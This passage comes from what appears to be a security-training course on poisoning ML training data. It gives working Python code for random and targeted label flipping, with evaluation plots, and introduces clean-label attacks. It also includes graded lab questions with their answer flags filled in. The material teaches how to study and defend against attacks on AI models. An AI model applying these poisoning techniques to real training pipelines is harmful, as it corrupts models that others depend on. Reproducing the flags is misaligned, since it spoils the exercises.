Because our data is so clearly separated, the shifting boundaries don't actually cause any significant accuracy loss. Remember, this is only the case for our limited data, in a real world attack, where data is far from being clean or clear, it's quite probable that even a slight shift in the boundary will cause an accuracy loss.

![Line graph titled 'Model Accuracy vs. Label Flipping Percentage' showing accuracy on clean test set remaining high until a drop at 50% of training labels flipped.](/storage/modules/302/label_flipping_consolidated_accuracy.png)

Despite this no significant loss in accuracy until 50% of the data is poisoned, the `decison boundary` will still be constantly shifting. We can plot all of the boundaries overlaid into a single image to clearly visualize this phenomenon.

```python
plt.figure(figsize=(12, 8))

# Plot the original clean data points for reference
plt.scatter(
    X_train[:, 0],
    X_train[:, 1],
    c=y_train,
    cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]),
    edgecolors=node_black,
    s=50,
    alpha=0.5,
    label="Clean Data Points",
)

contour_colors = {
    0.0: htb_green,
    0.10: aquamarine,
    0.20: nugget_yellow,
    0.30: vivid_purple,
    0.40: azure,
    0.50: malware_red,
}
contour_linestyles = {
    0.0: "solid",
    0.10: "dashed",
    0.20: "dashed",
    0.30: "dashed",
    0.40: "dashed",
    0.50: "dashed",
}

# Get baseline boundary data
baseline_model_idx = results["percentage"].index(0.0)
baseline_model_retrieved = results["model"][baseline_model_idx]
if baseline_model_retrieved:
    Z_baseline = baseline_model_retrieved.predict(mesh_points).reshape(xx.shape)
    cs = plt.contour(
        xx,
        yy,
        Z_baseline,
        levels=[0.5],
        colors=[contour_colors[0.0]],
        linestyles=[contour_linestyles[0.0]],
        linewidths=[2.5],
    )

boundary_indices_to_plot = [0.10, 0.20, 0.30, 0.40, 0.50]
plotted_percentages = [0.0]

# Sort decision_boundaries_data by percentage to ensure consistent plotting order
decision_boundaries_data.sort(key=lambda item: item["percentage"])

for data in decision_boundaries_data:
    pp = data["percentage"]
    if pp in boundary_indices_to_plot:
        if pp in contour_colors and pp in contour_linestyles:
            Z = data["Z"]
            cs = plt.contour(
                xx,
                yy,
                Z,
                levels=[0.5],
                colors=[contour_colors[pp]],
                linestyles=[contour_linestyles[pp]],
                linewidths=[2.5],
            )
            plotted_percentages.append(pp)
        else:
            print(f"Warning: Style not defined for {pp * 100}%, skipping contour.")


plt.title(
    "Shift in Decision Boundary with Increasing Label Flipping",
    fontsize=16,
    color=htb_green,
)
plt.xlabel("Feature 1", fontsize=12)
plt.ylabel("Feature 2", fontsize=12)

# Create legend
legend_handles = []
for pp in sorted(plotted_percentages):
    if (
        pp in contour_colors and pp in contour_linestyles
    ):  # Check again before creating legend entry
        legend_handles.append(
            plt.Line2D(
                [0],
                [0],
                color=contour_colors[pp],
                lw=2.5,
                linestyle=contour_linestyles[pp],
                label=f"Boundary ({pp * 100:.0f}% Poisoned)",
            )
        )

# Add legend for data points as well
data_handles = [
    plt.Line2D(
        [0],
        [0],
        marker="o",
        color="w",
        label="Class 0",
        markersize=10,
        markerfacecolor=azure,
        linestyle="None",
    ),
    plt.Line2D(
        [0],
        [0],
        marker="o",
        color="w",
        label="Class 1",
        markersize=10,
        markerfacecolor=nugget_yellow,
        linestyle="None",
    ),
]

plt.legend(handles=legend_handles + data_handles, title="Boundaries & Data")
plt.grid(True, color=hacker_grey, linestyle="--", linewidth=0.5, alpha=0.3)
plt.xlim(xx.min(), xx.max())
plt.ylim(yy.min(), yy.max())
plt.show()
```

Which will generate this plot:

![Scatter plot titled 'Shift in Decision Boundary with Increasing Label Flipping' showing boundaries for 0% to 50% poisoned data, with Class 0 (blue) and Class 1 (orange) across Feature 1 and Feature 2.](/storage/modules/302/label_flipping_consolidated.png)

Here we can clearly see the `decision boundary` becoming increasingly distorted as the model attempted to accommodate the incorrect labels for each fraction of poisoned data.

### Questions (section)
- {"id": 3095, "question": "Download the label_flipping_student.zip file attached to this question, and extract the notebook template and dataset file within it. Using the techniques that have been demonstrated in this section, implement a label flipping attack in the provided flip_labels method stub to poison 60% of the dataset, train a model using the provided code, and submit the trained model to the docker instance using the last cell in the notebook. Submit the flag you receive for a valid attack as the answer to this question.", "hint": null, "file": "https://cdn.services-k8s.prod.aws.htb.systems/content/questions/file/1d3acb71-d357-4d43-aa74-87252e39eb6b.zip", "has_file": true, "protocol": null, "username": null, "password": null, "order": null, "cubes": 2, "experience_points": 60, "userAnswer": "HTB{l4b3l_fl1pp1ng_pwnz_d3f4ult}", "user_answer": "HTB{l4b3l_fl1pp1ng_pwnz_d3f4ult}"}


---

<!-- section 3523 | page 8 | group: Label Attacks | type: interactive -->

# Targeted Label Attacks

---

So far, we have explored `Label Flipping`. The primary goal there was general `performance degradation` - making the model less accurate overall. Now let's explore a more focused variant of a data poisoning attack: the `Targeted Label Attack`.

Unlike the broad impact caused by random label flipping, a `Targeted Label Attack` has a more specific objective: an adversary aims to cause the trained model to `misclassify specific, chosen target instances` or, more commonly, instances belonging to a particular `target class`. Instead of just reducing overall accuracy, the adversary wants to manipulate the model's behavior in a predictable way for certain inputs.

We are going to revisit the same sentiment analysis scenario from the previous attack, but instead of just making the model generally worse at distinguishing `positive from negative` reviews, we are going to use a targeted approach specifically aiming to make the model misclassify genuinely `positive` reviews about a product as `negative`. This requires a slightly more strategic approach to poisoning the data.

## The Attack Strategy

Our strategy is to identify training data points belonging to the `target class` (e.g., `positive` reviews, Class 1) and then deliberately change their labels to represent a different class (e.g., `negative`, Class 0). This focused manipulation directly interferes with the model's learning process concerning its understanding and classification of the target class.<p><p>We have already established that a <code>Logistic Regression</code>
model is trained by minimizing the
<code>average binary cross-entropy</code> (or <code>log-loss</code>)
function,
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>L</mi><annotation encoding="application/x-tex">L</annotation></semantics></math>:</p></p>
<p><p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo stretchy="false" form="prefix">(</mo><mi>𝐰</mi><mo>,</mo><mi>b</mi><mo stretchy="false" form="postfix">)</mo><mo>=</mo><mi>−</mi><mfrac><mn>1</mn><mi>N</mi></mfrac><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>N</mi></munderover><mrow><mo stretchy="true" form="prefix">[</mo><msub><mi>y</mi><mi>i</mi></msub><mi>log</mi><mo stretchy="false" form="prefix">(</mo><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false" form="postfix">)</mo><mo>+</mo><mo stretchy="false" form="prefix">(</mo><mn>1</mn><mo>−</mo><msub><mi>y</mi><mi>i</mi></msub><mo stretchy="false" form="postfix">)</mo><mi>log</mi><mo stretchy="false" form="prefix">(</mo><mn>1</mn><mo>−</mo><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false" form="postfix">)</mo><mo stretchy="true" form="postfix">]</mo></mrow></mrow><annotation encoding="application/x-tex">L(\mathbf{w}, b) = -\frac{1}{N} \sum_{i=1}^{N} \left[ y_i \log(p_i) + (1 - y_i) \log(1 - p_i) \right]</annotation></semantics></math></p></p>
<p><p>Here,
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>y</mi><mi>i</mi></msub><annotation encoding="application/x-tex">y_i</annotation></semantics></math>
is the true label (0 or 1), and
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>p</mi><mi>i</mi></msub><annotation encoding="application/x-tex">p_i</annotation></semantics></math>
is the model’s predicted probability that instance
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>𝐱</mi><mi>i</mi></msub><annotation encoding="application/x-tex">\mathbf{x}_i</annotation></semantics></math>
belongs to <code>Class 1</code>, calculated as
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub><mo>=</mo><mi>σ</mi><mo stretchy="false" form="prefix">(</mo><msup><mi>𝐰</mi><mi>T</mi></msup><msub><mi>𝐱</mi><mi>i</mi></msub><mo>+</mo><mi>b</mi><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">p_i = \sigma(\mathbf{w}^T \mathbf{x}_i + b)</annotation></semantics></math>,
where
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>σ</mi><annotation encoding="application/x-tex">\sigma</annotation></semantics></math>
is the <code>sigmoid function</code>, and as we know, the model adjusts
its weights
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>𝐰</mi><annotation encoding="application/x-tex">\mathbf{w}</annotation></semantics></math>
and bias
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>b</mi><annotation encoding="application/x-tex">b</annotation></semantics></math>
to make the predicted probabilities
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>p</mi><mi>i</mi></msub><annotation encoding="application/x-tex">p_i</annotation></semantics></math>
align closely with the true labels
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>y</mi><mi>i</mi></msub><annotation encoding="application/x-tex">y_i</annotation></semantics></math>,
thus minimizing
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>L</mi><annotation encoding="application/x-tex">L</annotation></semantics></math>.</p></p>
<p><p>Now, consider a targeted attack aiming to make the model misclassify
<code>Class 1</code> instances as <code>Class 0</code>. The adversary
selects a subset of training instances
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false" form="prefix">(</mo><msub><mi>𝐱</mi><mi>j</mi></msub><mo>,</mo><msub><mi>y</mi><mi>j</mi></msub><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">(\mathbf{x}_j, y_j)</annotation></semantics></math>
where the true label
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>y</mi><mi>j</mi></msub><annotation encoding="application/x-tex">y_j</annotation></semantics></math>
is 1. They then change these labels in the training data to
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><msup><mi>j</mi><mo>′</mo></msup></msub><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">y_j&#39; = 0</annotation></semantics></math>.</p></p>
<p><p>During training, when the model processes such a poisoned instance
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>𝐱</mi><mi>j</mi></msub><annotation encoding="application/x-tex">\mathbf{x}_j</annotation></semantics></math>,
it is expected to calculate a high probability
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>p</mi><mi>j</mi></msub><annotation encoding="application/x-tex">p_j</annotation></semantics></math>
(close to 1) because the features of
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>𝐱</mi><mi>j</mi></msub><annotation encoding="application/x-tex">\mathbf{x}_j</annotation></semantics></math>
strongly suggest it belongs to <code>Class 1</code>.</p></p>
<p><p>With the original label
(<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>j</mi></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">y_j = 1</annotation></semantics></math>),
the contribution to the loss for this instance would be
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>−</mi><mi>log</mi><mo>&#8289;</mo><mo stretchy="false" form="prefix">(</mo><msub><mi>p</mi><mi>j</mi></msub><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">-\log(p_j)</annotation></semantics></math>,
which is small if
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>p</mi><mi>j</mi></msub><annotation encoding="application/x-tex">p_j</annotation></semantics></math>
is high (close to 1).With the flipped label
(<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><msup><mi>j</mi><mo>′</mo></msup></msub><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">y_j&#39; = 0</annotation></semantics></math>),
the contribution to the loss becomes
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>−</mi><mi>log</mi><mo>&#8289;</mo><mo stretchy="false" form="prefix">(</mo><mn>1</mn><mo>−</mo><msub><mi>p</mi><mi>j</mi></msub><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">-\log(1 - p_j)</annotation></semantics></math>.
Since
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>p</mi><mi>j</mi></msub><annotation encoding="application/x-tex">p_j</annotation></semantics></math>
is high,
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false" form="prefix">(</mo><mn>1</mn><mo>−</mo><msub><mi>p</mi><mi>j</mi></msub><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">(1-p_j)</annotation></semantics></math>
is low (close to 0), making
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>−</mi><mi>log</mi><mo>&#8289;</mo><mo stretchy="false" form="prefix">(</mo><mn>1</mn><mo>−</mo><msub><mi>p</mi><mi>j</mi></msub><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">-\log(1-p_j)</annotation></semantics></math>
<code>a very large positive value</code>.</p></p>
<p><p>This large error signal, specifically generated by instances that
look like <code>Class 1</code> but are labeled as <code>Class 0</code>,
significantly impacts the parameter updates during optimization (e.g.,
by yielding large gradients). The model is forced to adjust
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>𝐰</mi><annotation encoding="application/x-tex">\mathbf{w}</annotation></semantics></math>
and
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>b</mi><annotation encoding="application/x-tex">b</annotation></semantics></math>
to reduce this artificially large error. This adjustment inevitably
pushes the <code>decision boundary</code> - the threshold defined by
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>𝐰</mi><mi>T</mi></msup><mi>𝐱</mi><mo>+</mo><mi>b</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\mathbf{w}^T \mathbf{x} + b = 0</annotation></semantics></math>
where the model is uncertain
(<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>=</mo><mn>0.5</mn></mrow><annotation encoding="application/x-tex">p=0.5</annotation></semantics></math>)
- away from its optimal position. In other words, the boundary shifts
specifically to incorrectly classify more of the feature region
associated with true <code>Class 1</code> instances as
<code>Class 0</code>. This creates the intended bias, making the model
prone to misclassifying genuine <code>Class 1</code> samples.</p></p>


## Attack Implementation

To execute this strategy, we define a new function that will allow us to specify `which class` to target and what percentage of `only that class's samples` should have their labels flipped.

The logic looks like the following:

1.  Identify all training samples belonging to the designated `target_class`.
2.  Calculate the number of samples to flip based on the `poison_percentage` applied only to the count of target class samples.
3.  Randomly select that number of samples `from the identified target class indices`.
4.  Flip the labels of these selected samples to the opposite class.

First, we define the function signature and perform essential input validation. We check if `poison_percentage` is within the valid range [0, 1]. We also ensure the `target_class` and `new_class` are distinct and that both specified classes actually exist within the provided label array `y`. Raising errors for invalid inputs prevents unexpected behavior later.

```python
def targeted_flip_labels(y, poison_percentage, target_class, new_class, seed=1337):

    if not 0 <= poison_percentage <= 1:
        raise ValueError("poison_percentage must be between 0 and 1.")
    if target_class == new_class:
        raise ValueError("target_class and new_class cannot be the same.")
    # Ensure target_class and new_class are present in y
    unique_labels = np.unique(y)
    if target_class not in unique_labels:
         raise ValueError(f"target_class ({target_class}) does not exist in y.")
    if new_class not in unique_labels:
         raise ValueError(f"new_class ({new_class}) does not exist in y.")

```

Next, we identify the specific samples belonging to the `target_class`. We use `np.where` to find all indices in the label array `y` where the label matches `target_class`. The number of such samples (`n_target_samples`) is stored. If no samples of the `target_class` are found, we print a warning and return the original labels unchanged, as no flipping is possible.

```python
    # Identify indices belonging to the target class
    target_indices = np.where(y == target_class)[0]
    n_target_samples = len(target_indices)

    if n_target_samples == 0:
        print(f"Warning: No samples found for target_class {target_class}. No labels flipped.")
        return y.copy(), np.array([], dtype=int)
```

Based on the number of target samples found (`n_target_samples`) and the desired `poison_percentage`, we calculate the absolute number of labels to flip (`n_to_flip`). This calculation ensures the percentage is only applied relative to the size of the target class subset. If the calculated `n_to_flip` is zero (e.g., due to a very low percentage or small target class size), we issue a warning and return without making changes.

```python
    # Calculate the number of labels to flip within the target class
    n_to_flip = int(n_target_samples * poison_percentage)

    if n_to_flip == 0:
        print(f"Warning: Poison percentage ({poison_percentage * 100:.1f}%) is too low "
              f"to flip any labels in the target class (size {n_target_samples}).")
        return y.copy(), np.array([], dtype=int)
```

To select which specific samples within the target class will have their labels flipped, we employ a random selection process governed by the provided `seed` for reproducibility. We initialize a dedicated NumPy random number generator (`rng_instance`) with this seed. Then, we randomly choose `n_to_flip` unique indices `from the set of target class indices` (`target_indices`). 

This selection (`indices_within_target_set_to_flip`) refers to positions `within` the `target_indices` array; we then map these back to the original indices in the full `y` array to get `flipped_indices`.

```python
    # Use a dedicated random number generator instance with the specified seed
    rng_instance = np.random.default_rng(seed)

    # Randomly select indices from the target_indices subset to flip
    # These are indices relative to the target_indices array
    indices_within_target_set_to_flip = rng_instance.choice(
        n_target_samples, size=n_to_flip, replace=False
    )
    # Map these back to the original array indices
    flipped_indices = target_indices[indices_within_target_set_to_flip]
```

Now we perform the label flipping. To avoid modifying the input array directly, we create a copy named `y_poisoned`. Using the `flipped_indices` obtained above, we access these specific locations in `y_poisoned` and assign them the value of `new_class`.

```python
    # Create a copy to avoid modifying the original array
    y_poisoned = y.copy()

    # Perform the flip for the selected indices to the new class label
    y_poisoned[flipped_indices] = new_class
```

For clarity and verification, we include print statements summarizing the operation: detailing the classes involved, the number of target samples identified, the number intended to be flipped, and the actual number successfully flipped.

```python
    print(f"Targeting Class {target_class} for flipping to Class {new_class}.")
    print(f"Identified {n_target_samples} samples of Class {target_class}.")
    print(f"Attempting to flip {poison_percentage * 100:.1f}% ({n_to_flip} samples) of these.")
    print(f"Successfully flipped {len(flipped_indices)} labels.")
```

Finally, the function returns the `y_poisoned` array containing the modified labels (with the targeted flips applied) and the `flipped_indices` array, which identifies precisely which samples were altered.

```python
    return y_poisoned, flipped_indices
```


The next step is to generate the poisoned dataset 

```python
poison_percentage_targeted = 0.40  # Target 40%
target_class_to_flip = 1  # Target Class 1 (Positive)
new_label_for_flipped = 0  # Flip them to Class 0 (Negative)

# Use the function to create the poisoned dataset
y_train_targeted_poisoned, targeted_flipped_indices = targeted_flip_labels(
    y_train,
    poison_percentage_targeted,
    target_class_to_flip,
    new_label_for_flipped,
    seed=SEED,  # Use the global SEED for reproducibility
)

print("\n--- Visualizing Targeted Poisoned Data ---")
# Plot the result of the targeted flip
plot_poisoned_data(
    X_train,
    y_train,  # Pass original y
    y_train_targeted_poisoned,
    targeted_flipped_indices,
    title=f"Training Data: {poison_percentage_targeted * 100:.0f}% of Class {target_class_to_flip} Flipped to {new_label_for_flipped}",
    target_class_info=target_class_to_flip,
)
```

![Scatter plot titled 'Training Data: 40% of Class 1 Flipped to 0' showing Class 0 (blue), Class 1 (yellow), and Flipped Points (red X) across Feature 1 and Feature 2.](/storage/modules/302/target_label_flip_poison.png)

Then train a new `LogisticRegression` model using this poisoned data. We use the original features `X_train` but pair them with the corrupted labels `y_train_targeted_poisoned`.

```python
targeted_poisoned_model = LogisticRegression(random_state=SEED)
targeted_poisoned_model.fit(X_train, y_train_targeted_poisoned)
```

---

<!-- section 3524 | page 9 | group: Label Attacks | type: interactive -->

# Evaluating the Targeted Label Attack

---

With the new model trained, we can next evaluate its performance. We do this by evaluating the poisoned model on the clean test set to assess how the attack has degraded its accuracy. 

```python
# Predict on the original, clean test set
y_pred_targeted = targeted_poisoned_model.predict(X_test)

# Calculate accuracy on the clean test set
targeted_accuracy = accuracy_score(y_test, y_pred_targeted)
print(f"\n--- Evaluating Targeted Poisoned Model ---")
print(f"Accuracy on clean test set: {targeted_accuracy:.4f}")
print(f"Baseline accuracy was: {baseline_accuracy:.4f}")

# Display classification report
print("\nClassification Report on Clean Test Set:")
print(
    classification_report(y_test, y_pred_targeted, target_names=["Class 0", "Class 1"])
)

# Plot confusion matrix
cm_targeted = confusion_matrix(y_test, y_pred_targeted)
plt.figure(figsize=(6, 5))
sns.heatmap(
    cm_targeted,
    annot=True,
    fmt="d",
    cmap="binary",
    xticklabels=["Predicted 0", "Predicted 1"],
    yticklabels=["Actual 0", "Actual 1"],
    cbar=False,
)
plt.xlabel("Predicted Label", color=white)
plt.ylabel("True Label", color=white)
plt.title("Confusion Matrix (Targeted Poisoned Model)", fontsize=14, color=htb_green)
plt.xticks(color=hacker_grey)
plt.yticks(color=hacker_grey)
plt.show()
```

Which will output this and the confusion matrix:

```python
--- Evaluating Targeted Poisoned Model ---
Accuracy on clean test set: 0.8100
Baseline accuracy was: 0.9933

Classification Report on Clean Test Set:
              precision    recall  f1-score   support

     Class 0       0.73      1.00      0.84       153
     Class 1       1.00      0.61      0.76       147

    accuracy                           0.81       300
   macro avg       0.86      0.81      0.80       300
weighted avg       0.86      0.81      0.80       300
```

![Confusion Matrix titled 'Targeted Poisoned Model' showing True Label vs. Predicted Label: 153 True Positives, 0 False Positives, 57 False Negatives, 90 True Negatives.](/storage/modules/302/target_label_confusionmatrix.png)

The attack dropped the model's accuracy from the baseline `0.9933` to `0.8100`. The classification report shows the specific impact: `Class 1` recall fell sharply to `0.61`, meaning the poisoned model correctly identified only 61% of true `Class 1` instances. Correspondingly, the `confusion matrix` shows `57` `False Negatives` (Actual `Class 1` predicted as `Class 0`). This confirms the attack successfully degraded the model's performance specifically for the intended target class.

We can plot the boundary of the `targeted_poisoned_model` compared to the `baseline_model` to clearly see how the boundary has shifted with the attack.

```python
# Plot the comparison of decision boundaries
plt.figure(figsize=(12, 8))

# Plot Baseline Decision Boundary (Solid Green)
Z_baseline = baseline_model.predict(mesh_points).reshape(xx.shape)
plt.contour(
    xx,
    yy,
    Z_baseline,
    levels=[0.5],
    colors=[htb_green],
    linestyles=["solid"],
    linewidths=[2.5],
)

# Plot Targeted Poisoned Decision Boundary (Dashed Red)
Z_targeted = targeted_poisoned_model.predict(mesh_points).reshape(xx.shape)
plt.contour(
    xx,
    yy,
    Z_targeted,
    levels=[0.5],
    colors=[malware_red],
    linestyles=["dashed"],
    linewidths=[2.5],
)

plt.title(
    "Comparison: Baseline vs. Targeted Poisoned Decision Boundary",
    fontsize=16,
    color=htb_green,
)
plt.xlabel("Feature 1", fontsize=12)
plt.ylabel("Feature 2", fontsize=12)

# Create legend combining data points and boundaries
handles = [
    plt.Line2D(
        [0],
        [0],
        color=htb_green,
        lw=2.5,
        linestyle="solid",
        label=f"Baseline Boundary (Acc: {baseline_accuracy:.3f})",
    ),
    plt.Line2D(
        [0],
        [0],
        color=malware_red,
        lw=2.5,
        linestyle="dashed",
        label=f"Targeted Poisoned Boundary (Acc: {targeted_accuracy:.3f})",
    ),
]

plt.legend(handles=handles, title="Boundaries & Data Points")
plt.grid(True, color=hacker_grey, linestyle="--", linewidth=0.5, alpha=0.3)
plt.xlim(xx.min(), xx.max())
plt.ylim(yy.min(), yy.max())
plt.show()
```

Which will generate this image, showing the shift in the boundary:

![Plot titled 'Baseline vs. Poisoned Decision Boundary' showing Baseline Boundary (accuracy 0.993) and Targeted Poisoned Boundary (accuracy 0.810) across Feature 1 and Feature 2.](/storage/modules/302/targeted_flip_baseline_vs_poisoned_boundary.png)

The plot vividly illustrates the effect of the attack. The `targeted poisoned boundary` has significantly shifted away from the boundary of the baseline model. The model, forced to accommodate the flipped Class 1 points (now labeled as Class 0), has learned a boundary that is much more likely to classify genuine Class 1 instances as Class 0.

The true test of the attack is how the poisoned model performs on new, previously unseen data. Let's generate a fresh batch of data points using similar distribution parameters (`cluster_std=1.50` is a little bigger for a bit of a data spread) as our original dataset but with a different random seed to ensure they are distinct. We will then use our `targeted_poisoned_model` to classify these points and see how many instances of the target class (Class 1) are misclassified, and display the boundary line.

```python
# Define parameters for unseen data generation
n_unseen_samples = 500
unseen_seed = SEED + 1337

# Generate unseen data
X_unseen, y_unseen = make_blobs(
    n_samples=n_unseen_samples,
    centers=centers,
    n_features=2,
    cluster_std=1.50,
    random_state=unseen_seed,
)

# Predict labels for the unseen data using the targeted poisoned model
y_pred_unseen_poisoned = targeted_poisoned_model.predict(X_unseen)

# Calculate misclassification statistics
true_target_class_indices = np.where(y_unseen == target_class_to_flip)[0]
misclassified_target_mask = (y_unseen == target_class_to_flip) & (
    y_pred_unseen_poisoned != target_class_to_flip
)
misclassified_target_indices = np.where(misclassified_target_mask)[0]
n_true_target = len(true_target_class_indices)
n_misclassified_target = len(misclassified_target_indices)

plt.figure(figsize=(12, 8))

# Plot all unseen points, colored by the poisoned model's prediction
plt.scatter(
    X_unseen[:, 0],
    X_unseen[:, 1],
    c=y_pred_unseen_poisoned,
    cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]),
    edgecolors=node_black,
    s=50,
    alpha=0.7,
    label="Predicted Label",
)

# Highlight the misclassified target points
if n_misclassified_target > 0:
    plt.scatter(
        X_unseen[misclassified_target_indices, 0],
        X_unseen[misclassified_target_indices, 1],
        facecolors="none",
        edgecolors=malware_red,
        linewidths=1.5,
        marker="X",
        s=120,
        label=f"Misclassified (True Class {target_class_to_flip})",
    )

# Calculate and plot decision boundary
Z_targeted_boundary = targeted_poisoned_model.predict(mesh_points).reshape(xx.shape)
plt.contour(
    xx,
    yy,
    Z_targeted_boundary,
    levels=[0.5],
    colors=[malware_red],
    linestyles=["dashed"],
    linewidths=[2.5],
)

# Set title
plt.title(
    f"Poisoned Model Predictions & Boundary on Unseen Data\n({n_misclassified_target} of {n_true_target} Class {target_class_to_flip} samples misclassified)",
    fontsize=16,
    color=htb_green,
)
plt.xlabel("Feature 1", fontsize=12)
plt.ylabel("Feature 2", fontsize=12)

# Create legend
handles = [
    plt.Line2D(
        [0],
        [0],
        marker="o",
        color="w",
        label=f"Predicted as Class 0 (Azure)",
        markersize=10,
        markerfacecolor=azure,
        linestyle="None",
    ),
    plt.Line2D(
        [0],
        [0],
        marker="o",
        color="w",
        label=f"Predicted as Class 1 (Yellow)",
        markersize=10,
        markerfacecolor=nugget_yellow,
        linestyle="None",
    ),
    *(
        [
            plt.Line2D(
                [0],
                [0],
                marker="X",
                color="w",
                label=f"Misclassified (True Class {target_class_to_flip})",
                markersize=12,
                markeredgecolor=malware_red,
                markerfacecolor="none",
                linestyle="None",
            )
        ]
        if n_misclassified_target > 0
        else []
    ),
    plt.Line2D(
        [0],
        [0],
        color=malware_red,
        lw=2.5,
        linestyle="dashed",
        label="Decision Boundary (Targeted Model)",
    ),
]
plt.legend(handles=handles, title="Predictions, Errors & Boundary")
plt.grid(True, color=hacker_grey, linestyle="--", linewidth=0.5, alpha=0.3)

# Set plot limits
plt.xlim(xx.min(), xx.max())
plt.ylim(yy.min(), yy.max())

# Apply theme to background
fig = plt.gcf()
fig.set_facecolor(node_black)
ax = plt.gca()
ax.set_facecolor(node_black)

plt.show()
```

This visualization shows the `targeted_poisoned_model`'s predictions and its decision boundary applied to the unseen data.

![Scatter plot titled 'Poisoned Model Predictions & Boundary on Unseen Data' showing Predicted Class 0 (blue), Predicted Class 1 (yellow), Misclassified (red X), and Decision Boundary (dashed line) across Feature 1 and Feature 2.](/storage/modules/302/targeted_flip_unseen_predictions.png)

 The points marked with a red 'X' represent true `Class 1` instances that the poisoned model incorrectly predicts as `Class 0`. These misclassifications primarily occur within the actual `Class 1` cluster but fall on the `Class 0` side of the shifted decision boundary (dashed red line). 

 This clearly demonstrates how the boundary shift induced by the targeted attack successfully causes the intended misclassifications on new, unseen data.

### Questions (section)
- {"id": 3033, "question": "Download the targeted_label_student.zip file attached to this question, and extract the notebook template and dataset file within it. Using the techniques that have been demonstrated in this section, implement a targeted label flipping attack in the provided targeted_class_label_flip method stub to poison at least 50% of the class 0 labels as class 1 in thedataset, train a model using the provided code, and submit the trained model to the docker instance using the last cell in the notebook. Submit the flag you receive for a valid attack as the answer to this question.", "hint": null, "file": "https://cdn.services-k8s.prod.aws.htb.systems/content/questions/file/bb2b4aee-ab46-43a8-874a-3c90037424be.zip", "has_file": true, "protocol": null, "username": null, "password": null, "order": null, "cubes": 3, "experience_points": 60, "userAnswer": "HTB{l4b3l_fl1pp1ng_targeted_pwnz}", "user_answer": "HTB{l4b3l_fl1pp1ng_targeted_pwnz}"}


---

<!-- section 3563 | page 10 | group: Feature Attacks | type: interactive -->

# Clean Label Attacks

---

So far, we have explored data poisoning attacks like `Label Flipping` and `Targeted Label Flipping`. Both of these methods directly manipulated the `ground truth labels` associated with training data instances. We now explore another category of data poisoning attacks: the `Clean Label Attack`.

A defining characteristic of `Clean Label Attacks`  compared to the label attacks, is that `they do not alter the ground truth labels of the training data`. Instead, an adversary carefully `modifies the features` of one or more training instances. These modifications are crafted such that the original assigned label remains plausible (or technically correct) for the modified features. The goal is typically highly targeted: to cause the model trained on this poisoned data to misclassify specific, pre-determined `target instances` during inference. This happens even though the poisoned training data itself might appear relatively normal, with labels that seem consistent with the (perturbed) features.

Let's consider a manufacturing quality control scenario. Imagine a system using measurements like `component length` and `component weight` (the features) to automatically classify manufactured parts into three categories: `Major Defect` (Class 0), `Acceptable` (Class 1), or `Minor Defect` (Class 2). Suppose an adversary wants a specific batch of `Acceptable` parts (`target instance`, true label 1) to be rejected by being classified as having a Major Defect.

